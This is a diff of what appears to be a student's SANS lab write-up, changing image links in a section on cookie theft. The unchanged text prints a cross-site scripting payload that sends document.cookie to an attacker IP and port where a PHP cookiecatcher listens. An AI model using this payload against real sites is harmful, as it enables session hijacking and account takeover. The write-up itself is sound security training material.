@@ -45,16 +45,15 @@ Typically, administrators pages are hidden from normal users. If a web server is
 
 From the Vulnerability Discovery challenge, I know the site is vulnerable to a specific input based attack. In Lab 4.4 from this course, SANS supplied to us a cookiecatcher PHP file. I started a PHP web server to listen for the cookie.
 
-![Cookie Theft-2](https://github.com/user-attachments/assets/2c7745ff-5355-45e6-b776-8a5f270ba28d)
+![Cookie-Theft-1](https://github.com/user-attachments/assets/651eb28a-e077-49d8-a4f3-647beb1cce5c)
 
 After starting the listener on my attacker terminal, I went back to the browser. At the contact form, I put the following string in all of the fields then submited the form - <script>document.location='http://10.142.148.12:2222/?'+document.cookie;</script>
 
-![Cookie Theft-3](https://github.com/user-attachments/assets/27d2e9b7-6333-4f3a-9d7d-363310cc713b)
-
+![Cookie-Theft-2](https://github.com/user-attachments/assets/92775db5-f99f-4975-bead-2d2a6ef18727)
 
 Going back to my attacker terminal, where the cookiecatcher PHP file is running, I can see the name of the stolen cookie. 
 
-![396193111-3f8a0591-ff61-47d9-ad03-60ac8a6ae1ed](https://github.com/user-attachments/assets/54c44f79-0f51-4ca6-b5c6-1a05b60ffecf)
+![Cookie-Theft-3](https://github.com/user-attachments/assets/96974117-4f82-4657-acc7-190582a682f6)
 
 
 # Unauthorized Access
